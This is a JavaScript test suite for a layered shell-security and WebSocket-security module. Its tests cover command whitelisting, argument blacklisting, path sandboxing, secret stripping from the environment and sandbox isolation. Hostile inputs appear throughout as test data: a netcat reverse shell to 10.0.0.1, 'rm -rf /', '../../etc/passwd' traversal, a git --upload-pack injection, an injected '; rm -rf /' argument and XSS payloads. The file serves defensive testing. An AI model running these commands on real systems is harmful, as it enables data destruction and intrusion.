/**
 * Sprint 7 Tests — Security & Trust
 * Penetration tests for all 7 defense layers + WS security.
 * No external dependencies.
 */
'use strict';
const assert = require('assert');
const path = require('path');
const fs = require('fs');
const os = require('os');
const {
  ShellSecurityService, ALLOWED_COMMANDS, BLOCKED_ARGS, COMMAND_BLOCKED_ARGS,
  NPM_SAFE_SUBCOMMANDS, NPM_FORCE_IGNORE_SCRIPTS,
  sanitizeEnv, isEnvSensitive,
  SessionTokenManager, RateLimiter, InputValidator, WsSecurityGuard,
  ProcessIsolation,
} = require('../packages/c3-backend/sprint7-integration.cjs');

let testCount = 0, passCount = 0;
function test(name, fn) { testCount++; try { fn(); passCount++; console.log('  ✅ ' + name); } catch (e) { console.log('  ❌ ' + name + ': ' + e.message); } }

// Create a temp project dir for sandbox tests
const projectRoot = path.join(os.tmpdir(), 'c3-s7-project-' + Date.now());
const subDir = path.join(projectRoot, 'src');
fs.mkdirSync(subDir, { recursive: true });

const svc = new ShellSecurityService();

// ══════════════════════════════════════════════════════════
// 1. Layer 1: Command Whitelist
// ══════════════════════════════════════════════════════════
console.log('\n--- 1. Layer 1: Command Whitelist ---');

test('allowed command: ls', () => {
  const r = svc.validate('ls', ['.'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
});

test('allowed command: node', () => {
  const r = svc.validate('node', ['index.js'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
});

test('allowed command: git', () => {
  const r = svc.validate('git', ['status'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
});

test('BLOCKED: rm', () => {
  const r = svc.validate('rm', ['-rf', '/'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 1);
});

test('BLOCKED: bash', () => {
  const r = svc.validate('bash', ['-c', 'echo pwned'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 1);
});

test('BLOCKED: sh', () => {
  const r = svc.validate('sh', ['-c', 'whoami'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 1);
});

test('BLOCKED: sudo', () => {
  const r = svc.validate('sudo', ['rm', '-rf', '/'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 1);
});

test('BLOCKED: nc (netcat)', () => {
  const r = svc.validate('nc', ['-e', '/bin/sh', '10.0.0.1'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 1);
});

test('BLOCKED: perl', () => {
  const r = svc.validate('perl', ['-e', 'system("whoami")'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 1);
});

test('BLOCKED: /usr/bin/bash (full path)', () => {
  const r = svc.validate('/usr/bin/bash', ['-c', 'echo'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 1);
});

// ══════════════════════════════════════════════════════════
// 2. Layer 2: Arg Blacklist
// ══════════════════════════════════════════════════════════
console.log('\n--- 2. Layer 2: Arg Blacklist ---');

test('BLOCKED: node -e (eval)', () => {
  const r = svc.validate('node', ['-e', 'process.exit()'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 2);
});

test('BLOCKED: node --eval', () => {
  const r = svc.validate('node', ['--eval', 'code'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 2);
});

test('BLOCKED: python3 -c', () => {
  const r = svc.validate('python3', ['-c', 'import os'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 2);
});

test('BLOCKED: git --upload-pack', () => {
  const r = svc.validate('git', ['clone', '--upload-pack=evil', 'repo'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 2);
});

test('BLOCKED: curl -o (write arbitrary)', () => {
  const r = svc.validate('curl', ['-o', '/etc/passwd', 'url'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 2);
});

test('BLOCKED: curl --output=path', () => {
  const r = svc.validate('curl', ['--output', '/tmp/bad', 'url'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 2);
});

test('allowed: curl https://... (no -o)', () => {
  const r = svc.validate('curl', ['https://example.com'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
});

test('allowed: node index.js (no -e)', () => {
  const r = svc.validate('node', ['index.js'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
});

// ══════════════════════════════════════════════════════════
// 3. Layer 2b: npm Safety
// ══════════════════════════════════════════════════════════
console.log('\n--- 3. Layer 2b: npm Safety ---');

test('npm install → injects --ignore-scripts', () => {
  const r = svc.validate('npm', ['install'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
  assert.ok(r.sanitizedArgs.includes('--ignore-scripts'), 'Must inject --ignore-scripts');
});

test('npm ci → injects --ignore-scripts', () => {
  const r = svc.validate('npm', ['ci'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
  assert.ok(r.sanitizedArgs.includes('--ignore-scripts'));
});

test('npm install --ignore-scripts → no duplicate', () => {
  const r = svc.validate('npm', ['install', '--ignore-scripts'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
  const count = r.sanitizedArgs.filter(a => a === '--ignore-scripts').length;
  assert.strictEqual(count, 1);
});

test('npm test → no --ignore-scripts needed', () => {
  const r = svc.validate('npm', ['test'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
  assert.ok(!r.injectedArgs || r.injectedArgs.length === 0);
});

test('BLOCKED: npm exec (dangerous subcommand)', () => {
  const r = svc.validate('npm', ['exec', 'malicious-pkg'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 2);
});

test('BLOCKED: npm explore', () => {
  const r = svc.validate('npm', ['explore', 'pkg'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
});

test('allowed: npm run build', () => {
  const r = svc.validate('npm', ['run', 'build'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
});

// ══════════════════════════════════════════════════════════
// 4. Layer 4: cwd Sandbox + Path Traversal
// ══════════════════════════════════════════════════════════
console.log('\n--- 4. Layer 4: cwd Sandbox ---');

test('allowed: cwd = project root', () => {
  const r = svc.validate('ls', ['.'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
});

test('allowed: cwd = subdirectory', () => {
  const r = svc.validate('ls', ['.'], subDir, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
});

test('BLOCKED: cwd = /etc', () => {
  const r = svc.validate('ls', ['.'], '/etc', projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 4);
});

test('BLOCKED: cwd = /tmp (outside project)', () => {
  const r = svc.validate('ls', ['.'], '/tmp', projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 4);
});

test('BLOCKED: path traversal ../../etc/passwd in args', () => {
  const r = svc.validate('cat', ['../../etc/passwd'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 4);
});

test('BLOCKED: path traversal ../../../', () => {
  const r = svc.validate('ls', ['../../../'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 4);
});

test('allowed: relative path within project', () => {
  const r = svc.validate('cat', ['src/../src'], projectRoot, projectRoot);
  // src/../src resolves to src which is inside project
  assert.strictEqual(r.verdict, 'allow');
});

test('BLOCKED: nonexistent cwd', () => {
  const r = svc.validate('ls', ['.'], '/nonexistent/path', projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 4);
});

// ══════════════════════════════════════════════════════════
// 5. Layer 5: Environment Sanitization
// ══════════════════════════════════════════════════════════
console.log('\n--- 5. Layer 5: Env Sanitization ---');

test('strips ANTHROPIC_API_KEY', () => {
  assert.ok(isEnvSensitive('ANTHROPIC_API_KEY'));
  const env = sanitizeEnv({ ANTHROPIC_API_KEY: 'sk-ant-xxx', PATH: '/usr/bin' });
  assert.ok(!env.ANTHROPIC_API_KEY);
  assert.ok(env.PATH);
});

test('strips OPENAI_API_KEY', () => {
  assert.ok(isEnvSensitive('OPENAI_API_KEY'));
});

test('strips DATABASE_URL', () => {
  assert.ok(isEnvSensitive('DATABASE_URL'));
});

test('strips AWS_SECRET_ACCESS_KEY', () => {
  assert.ok(isEnvSensitive('AWS_SECRET_ACCESS_KEY'));
});

test('strips suffix: MY_APP_SECRET', () => {
  assert.ok(isEnvSensitive('MY_APP_SECRET'));
});

test('strips suffix: CUSTOM_TOKEN', () => {
  assert.ok(isEnvSensitive('CUSTOM_TOKEN'));
});

test('strips suffix: DB_PASSWORD', () => {
  assert.ok(isEnvSensitive('DB_PASSWORD'));
});

test('strips suffix: SOME_API_KEY', () => {
  assert.ok(isEnvSensitive('SOME_API_KEY'));
});

test('preserves PATH', () => {
  assert.ok(!isEnvSensitive('PATH'));
});

test('preserves HOME', () => {
  assert.ok(!isEnvSensitive('HOME'));
});

test('preserves NODE_ENV', () => {
  assert.ok(!isEnvSensitive('NODE_ENV'));
});

test('full sanitization preserves safe vars only', () => {
  const env = sanitizeEnv({
    PATH: '/usr/bin',
    HOME: '/home/user',
    ANTHROPIC_API_KEY: 'secret',
    DATABASE_URL: 'postgres://...',
    MY_JWT_SECRET: 'jwt-secret',
    NODE_ENV: 'production',
    LANG: 'en_US.UTF-8',
  });
  assert.deepStrictEqual(Object.keys(env).sort(), ['HOME', 'LANG', 'NODE_ENV', 'PATH']);
});

// ══════════════════════════════════════════════════════════
// 6. WS Security: Session Token
// ══════════════════════════════════════════════════════════
console.log('\n--- 6. WS Session Token ---');

test('token is 64 hex chars (256 bits)', () => {
  const tm = new SessionTokenManager();
  assert.strictEqual(tm.getToken().length, 64);
  assert.ok(/^[0-9a-f]{64}$/.test(tm.getToken()));
});

test('validate correct token', () => {
  const tm = new SessionTokenManager();
  assert.ok(tm.validate(tm.getToken()));
});

test('reject wrong token', () => {
  const tm = new SessionTokenManager();
  assert.ok(!tm.validate('wrong-token'));
});

test('reject empty token', () => {
  const tm = new SessionTokenManager();
  assert.ok(!tm.validate(''));
});

test('reject null token', () => {
  const tm = new SessionTokenManager();
  assert.ok(!tm.validate(null));
});

test('regenerate gives new token', () => {
  const tm = new SessionTokenManager();
  const old = tm.getToken();
  const newT = tm.regenerate();
  assert.notStrictEqual(old, newT);
  assert.ok(tm.validate(newT));
  assert.ok(!tm.validate(old));
});

// ══════════════════════════════════════════════════════════
// 7. WS Security: Rate Limiter
// ══════════════════════════════════════════════════════════
console.log('\n--- 7. WS Rate Limiter ---');

test('allows initial burst', () => {
  const rl = new RateLimiter(5, 1);  // burst=5, 1/sec refill
  for (let i = 0; i < 5; i++) {
    assert.ok(rl.allow('conn1'), `Request ${i + 1} should be allowed`);
  }
});

test('blocks after burst exhausted', () => {
  const rl = new RateLimiter(3, 0.01);  // burst=3, very slow refill
  assert.ok(rl.allow('conn1'));
  assert.ok(rl.allow('conn1'));
  assert.ok(rl.allow('conn1'));
  assert.ok(!rl.allow('conn1'));  // 4th should be blocked
});

test('different connections independent', () => {
  const rl = new RateLimiter(2, 0.01);
  assert.ok(rl.allow('a'));
  assert.ok(rl.allow('a'));
  assert.ok(!rl.allow('a'));
  assert.ok(rl.allow('b'));  // b has its own bucket
});

test('remove cleans bucket', () => {
  const rl = new RateLimiter(2, 0.01);
  rl.allow('c'); rl.allow('c');
  rl.remove('c');
  assert.ok(rl.allow('c'));  // Fresh bucket after remove
});

// ══════════════════════════════════════════════════════════
// 8. WS Security: Input Validation
// ══════════════════════════════════════════════════════════
console.log('\n--- 8. WS Input Validation ---');

const iv = new InputValidator(1024);  // 1KB limit for tests

test('BLOCKED: non-local address', () => {
  const r = iv.validateConnection('192.168.1.100', null, null);
  assert.strictEqual(r.allowed, false);
});

test('allowed: 127.0.0.1', () => {
  const r = iv.validateConnection('127.0.0.1', null, null);
  assert.strictEqual(r.allowed, true);
});

test('allowed: ::1 (IPv6 localhost)', () => {
  const r = iv.validateConnection('::1', null, null);
  assert.strictEqual(r.allowed, true);
});

test('allowed: ::ffff:127.0.0.1 (mapped)', () => {
  const r = iv.validateConnection('::ffff:127.0.0.1', null, null);
  assert.strictEqual(r.allowed, true);
});

test('BLOCKED: token required but missing', () => {
  const tm = new SessionTokenManager();
  const r = iv.validateConnection('127.0.0.1', undefined, tm);
  assert.strictEqual(r.allowed, false);
});

test('allowed: valid token', () => {
  const tm = new SessionTokenManager();
  const r = iv.validateConnection('127.0.0.1', tm.getToken(), tm);
  assert.strictEqual(r.allowed, true);
});

test('BLOCKED: oversized message', () => {
  const r = iv.validateMessage('x'.repeat(2000));
  assert.strictEqual(r.allowed, false);
  assert.ok(r.reason.includes('large') || r.reason.includes('limit') || r.reason.includes('size'), 'Reason: ' + r.reason);
});

test('BLOCKED: invalid JSON', () => {
  const r = iv.validateMessage('{broken');
  assert.strictEqual(r.allowed, false);
  assert.ok(r.reason.includes('JSON'));
});

test('BLOCKED: missing type field', () => {
  const r = iv.validateMessage(JSON.stringify({ content: 'hello' }));
  assert.strictEqual(r.allowed, false);
});

test('BLOCKED: unknown message type', () => {
  const r = iv.validateMessage(JSON.stringify({ type: 'exec_arbitrary' }));
  assert.strictEqual(r.allowed, false);
});

test('allowed: valid chat message', () => {
  const r = iv.validateMessage(JSON.stringify({ type: 'chat', content: 'hello' }));
  assert.strictEqual(r.allowed, true);
  assert.ok(r.sanitizedPayload);
  assert.strictEqual(r.sanitizedPayload.content, 'hello');
});

test('sanitizes script tags', () => {
  const r = iv.validateMessage(JSON.stringify({
    type: 'chat',
    content: '<script>alert("xss")</script>hello',
  }));
  assert.strictEqual(r.allowed, true);
  assert.ok(!r.sanitizedPayload.content.includes('<script>'));
  assert.ok(r.sanitizedPayload.content.includes('hello'));
});

test('sanitizes iframe tags', () => {
  const r = iv.validateMessage(JSON.stringify({
    type: 'chat',
    content: '<iframe src="evil.com"></iframe>text',
  }));
  assert.strictEqual(r.allowed, true);
  assert.ok(!r.sanitizedPayload.content.includes('<iframe'));
});

test('sanitizes null bytes', () => {
  const r = iv.validateMessage(JSON.stringify({
    type: 'chat',
    content: 'hello\0world',
  }));
  assert.strictEqual(r.allowed, true);
  assert.ok(!r.sanitizedPayload.content.includes('\0'));
});

// ══════════════════════════════════════════════════════════
// 9. WS Security Guard (combined)
// ══════════════════════════════════════════════════════════
console.log('\n--- 9. WsSecurityGuard ---');

test('full guard: auth + rate limit + validate', () => {
  const guard = new WsSecurityGuard({ rateBurst: 5, rateLimit: 60 });
  const token = guard.tokenManager.getToken();

  // Connection OK
  const connResult = guard.validateConnection('127.0.0.1', token);
  assert.ok(connResult.allowed);

  // Message OK
  const msgResult = guard.validateMessage('conn1', JSON.stringify({ type: 'chat', content: 'hi' }));
  assert.ok(msgResult.allowed);
});

test('full guard: reject non-local', () => {
  const guard = new WsSecurityGuard();
  const r = guard.validateConnection('10.0.0.1');
  assert.ok(!r.allowed);
});

test('full guard: rate limit after burst', () => {
  const guard = new WsSecurityGuard({ rateBurst: 2, rateLimit: 1 });
  const msg = JSON.stringify({ type: 'ping' });
  assert.ok(guard.validateMessage('c1', msg).allowed);
  assert.ok(guard.validateMessage('c1', msg).allowed);
  assert.ok(!guard.validateMessage('c1', msg).allowed);  // Rate limited
});

// ══════════════════════════════════════════════════════════
// 10. Process Isolation
// ══════════════════════════════════════════════════════════
console.log('\n--- 10. Process Isolation ---');

const pi = new ProcessIsolation();

test('builds bwrap args with read-only root', () => {
  const args = pi.buildSandboxArgs('ls', ['.'], '/project');
  assert.ok(args.includes('--ro-bind'));
  assert.ok(args.includes('/'));
});

test('builds bwrap args with project write access', () => {
  const args = pi.buildSandboxArgs('ls', ['.'], '/project');
  const bindIdx = args.indexOf('--bind');
  assert.ok(bindIdx >= 0);
  assert.strictEqual(args[bindIdx + 1], '/project');
});

test('builds bwrap args with die-with-parent', () => {
  const args = pi.buildSandboxArgs('ls', ['.'], '/project');
  assert.ok(args.includes('--die-with-parent'));
});

test('builds bwrap args with PID isolation', () => {
  const args = pi.buildSandboxArgs('ls', ['.'], '/project');
  assert.ok(args.includes('--unshare-pid'));
});

test('network isolation by default', () => {
  const args = pi.buildSandboxArgs('ls', ['.'], '/project');
  assert.ok(args.includes('--unshare-net'));
});

test('no network isolation when explicitly allowed', () => {
  const args = pi.buildSandboxArgs('npm', ['install'], '/project', { allowNetwork: true });
  assert.ok(!args.includes('--unshare-net'));
});

test('command and args after separator', () => {
  const args = pi.buildSandboxArgs('npm', ['test'], '/project');
  const sepIdx = args.indexOf('--');
  assert.ok(sepIdx >= 0);
  assert.strictEqual(args[sepIdx + 1], 'npm');
  assert.strictEqual(args[sepIdx + 2], 'test');
});

test('commandNeedsNetwork: npm install → true', () => {
  assert.ok(pi.commandNeedsNetwork('npm', ['install']));
});

test('commandNeedsNetwork: npm test → false', () => {
  assert.ok(!pi.commandNeedsNetwork('npm', ['test']));
});

test('commandNeedsNetwork: git clone → true', () => {
  assert.ok(pi.commandNeedsNetwork('git', ['clone', 'url']));
});

test('commandNeedsNetwork: git status → false', () => {
  assert.ok(!pi.commandNeedsNetwork('git', ['status']));
});

test('commandNeedsNetwork: ls → false', () => {
  assert.ok(!pi.commandNeedsNetwork('ls', ['.']));
});

test('commandNeedsNetwork: curl → true', () => {
  assert.ok(pi.commandNeedsNetwork('curl', ['https://example.com']));
});

// ══════════════════════════════════════════════════════════
// 11. Integration: Shell + cwd validation combo
// ══════════════════════════════════════════════════════════
console.log('\n--- 11. Integration Tests ---');

test('full chain: allowed git status in project', () => {
  const r = svc.validate('git', ['status'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
  assert.ok(r.sanitizedEnv);
  assert.ok(!r.sanitizedEnv.ANTHROPIC_API_KEY); // env sanitized
});

test('full chain: npm install gets --ignore-scripts + sanitized env', () => {
  const r = svc.validate('npm', ['install', 'express'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'allow');
  assert.ok(r.sanitizedArgs.includes('--ignore-scripts'));
  assert.ok(r.sanitizedEnv);
});

test('full chain: python -c blocked at layer 2', () => {
  const r = svc.validate('python3', ['-c', 'print("hi")'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 2);
});

test('full chain: cat /etc/passwd blocked at layer 4', () => {
  const r = svc.validate('cat', ['../../etc/passwd'], projectRoot, projectRoot);
  assert.strictEqual(r.verdict, 'block');
  assert.strictEqual(r.blockedByLayer, 4);
});

test('shell:false — semicolons are args not separators', () => {
  // In shell:false mode, "ls ; rm -rf /" would pass ["ls", ";", "rm", "-rf", "/"]
  // The semicolon is a literal arg. ";" itself passes Layer 1-2 for ls.
  // The key protection: rm is NOT the command being executed, it's an arg to ls.
  // ls would just get an error, not execute rm.
  const r = svc.validate('ls', ['; rm -rf /'], projectRoot, projectRoot);
  // "; rm -rf /" is a single arg with ".." nowhere, no blocked pattern
  assert.strictEqual(r.verdict, 'allow');
  // The safety here is: shell:false makes ";" a literal arg, not a separator
});

// ══════════════════════════════════════════════════════════
// Cleanup
// ══════════════════════════════════════════════════════════
fs.rmSync(projectRoot, { recursive: true, force: true });

console.log('\n=== Sprint 7 Tests: ' + passCount + '/' + testCount + ' passed ===');
if (passCount < testCount) process.exit(1);
